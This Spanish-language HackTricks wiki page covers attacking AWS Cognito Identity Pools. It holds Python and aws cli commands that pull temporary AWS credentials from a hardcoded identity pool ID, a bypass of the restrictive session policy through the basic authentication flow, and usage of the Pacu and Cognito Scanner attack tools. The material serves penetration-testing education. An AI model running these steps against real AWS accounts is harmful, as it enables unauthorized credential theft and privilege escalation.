# Pools de Identidad de Cognito

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Entrenamiento de HackTricks para Expertos en Equipos Rojos de AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Entrenamiento de HackTricks para Expertos en Equipos Rojos de GCP (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Información Básica

Los pools de identidad desempeñan un papel crucial al permitir que tus usuarios **adquieran credenciales temporales**. Estas credenciales son esenciales para acceder a varios servicios de AWS, incluidos, pero no limitados a Amazon S3 y DynamoDB. Una característica notable de los pools de identidad es su soporte tanto para usuarios anónimos como para una variedad de proveedores de identidad para la autenticación de usuarios. Los proveedores de identidad admitidos incluyen:

- Pools de usuarios de Amazon Cognito
- Opciones de inicio de sesión social como Facebook, Google, Iniciar sesión con Amazon e Iniciar sesión con Apple
- Proveedores compatibles con OpenID Connect (OIDC)
- Proveedores de identidad SAML (Security Assertion Markup Language)
- Identidades autenticadas por desarrolladores
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Para generar sesiones de Identity Pool, primero necesitas **generar un ID de identidad**. Este ID de identidad es la **identificación de la sesión de ese usuario**. Estas identificaciones pueden tener hasta 20 conjuntos de datos que pueden almacenar hasta 1 MB de pares clave-valor.

Esto es **útil para mantener información de un usuario** (que siempre estará utilizando el mismo ID de identidad).

Además, el servicio **cognito-sync** es el servicio que permite **administrar y sincronizar esta información** (en los conjuntos de datos, enviando información en streams y mensajes SNS...).

### Herramientas para pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), el marco de explotación de AWS, ahora incluye los módulos "cognito\_\_enum" y "cognito\_\_attack" que automatizan la enumeración de todos los activos de Cognito en una cuenta y señalan configuraciones débiles, atributos de usuario utilizados para el control de acceso, etc., y también automatizan la creación de usuarios (incluido el soporte de MFA) y la escalada de privilegios basada en atributos personalizables modificables, credenciales de pool de identidades utilizables, roles asumibles en tokens de identidad, etc.

Para obtener una descripción de las funciones de los módulos, consulta la parte 2 de la [publicación del blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Para instrucciones de instalación, consulta la página principal de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Uso

Uso de muestra de cognito\_\_attack para intentar la creación de usuarios y todos los vectores de escalada de privilegios contra un pool de identidades y un cliente de pool de usuarios específicos:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Ejemplo de uso de cognito\_\_enum para recopilar todos los grupos de usuarios, clientes de grupos de usuarios, grupos de identidades, usuarios, etc. visibles en la cuenta actual de AWS:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) es una herramienta CLI en python que implementa diferentes ataques en Cognito, incluyendo la creación no deseada de cuentas y la escalada de pool de identidades.

#### Instalación
```bash
$ pip install cognito-scanner
```
#### Uso
```bash
$ cognito-scanner --help
```
Para obtener credenciales de AWS en una aplicación Cognito como usuario no autenticado, lo único que necesita saber un atacante es el **ID del grupo de identidades**, el cual debe estar **codificado en duro** en la **aplicación** web/móvil para poder utilizarlo. Un ID tiene este aspecto: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (no se puede obtener por fuerza bruta).

{% hint style="success" %}
El **rol no autenticado IAM Cognito creado** por defecto se llama `Cognito_<Nombre del grupo de identidades>Unauth_Role`
{% endhint %}

Si encuentras un ID de grupo de identidades codificado en duro que permite usuarios no autenticados, puedes obtener credenciales de AWS con:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
O puedes usar los siguientes **comandos de aws cli**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Ten en cuenta que por defecto, un **usuario de Cognito no autenticado NO PUEDE tener ningún permiso, incluso si se asignó a través de una política**. Verifica la siguiente sección.
{% endhint %}

### Flujo de autenticación mejorado vs básico

La sección anterior siguió el **flujo de autenticación mejorado por defecto**. Este flujo establece una **política de sesión restrictiva** [**política de sesión**](../../aws-basic-information/#session-policies) para la sesión de rol IAM generada. Esta política solo permitirá que la sesión [**use los servicios de esta lista**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (incluso si el rol tenía acceso a otros servicios).

Sin embargo, hay una forma de evitar esto, si el **grupo de identidades tiene habilitado el "Flujo Básico (Clásico)"**, el usuario podrá obtener una sesión utilizando ese flujo que **no tendrá esa política de sesión restrictiva**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Si recibes este **error**, es porque el **flujo básico no está habilitado (predeterminado)**

`Se produjo un error (InvalidParameterException) al llamar a la operación GetOpenIdToken: el flujo básico (clásico) no está habilitado, por favor use el flujo mejorado.`
{% endhint %}

Teniendo un conjunto de credenciales IAM, debes verificar [qué acceso tienes](../../#whoami) e intentar [escalar privilegios](../../aws-privilege-escalation/).

### Autenticado

{% hint style="info" %}
Recuerda que los **usuarios autenticados** probablemente tendrán **permisos diferentes**, así que si puedes **registrarte dentro de la aplicación**, intenta hacerlo y obtener las nuevas credenciales.
{% endhint %}

También podría haber **roles** disponibles para **usuarios autenticados que acceden al grupo de identidades**.

Para esto es posible que necesites acceso al **proveedor de identidades**. Si ese es un **Grupo de Usuarios Cognito**, tal vez puedas abusar del comportamiento predeterminado y **crear un nuevo usuario tú mismo**.

{% hint style="success" %}
El **rol IAM Cognito autenticado creado a través de** es llamado por defecto `Cognito_<Nombre del Grupo de Identidades>Auth_Role`
{% endhint %}

De todas formas, el **siguiente ejemplo** espera que ya hayas iniciado sesión dentro de un **Grupo de Usuarios Cognito** utilizado para acceder al Grupo de Identidades (no olvides que también podrían estar configurados otros tipos de proveedores de identidad).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_ID_GRUPO_USUARIOS>=&#x3C;TOKEN_ID>

# Obtén el identity_id de la respuesta del comando anterior
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_ID_GRUPO_USUARIOS>=&#x3C;TOKEN_ID>


# En el IdToken puedes encontrar los roles a los que un usuario tiene acceso debido a los Grupos de Usuarios del Grupo
# Usa --custom-role-arn para obtener credenciales para un rol específico
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_ID_GRUPO_USUARIOS>=&#x3C;TOKEN_ID>
</code></pre>

{% hint style="warning" %}
Es posible **configurar diferentes roles IAM dependiendo del proveedor de identidad** con el que el usuario está iniciando sesión o incluso solo dependiendo **del usuario** (usando claims). Por lo tanto, si tienes acceso a diferentes usuarios a través del mismo o diferentes proveedores, podría valer la pena **iniciar sesión y acceder a los roles IAM de todos ellos**.
{% endhint %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
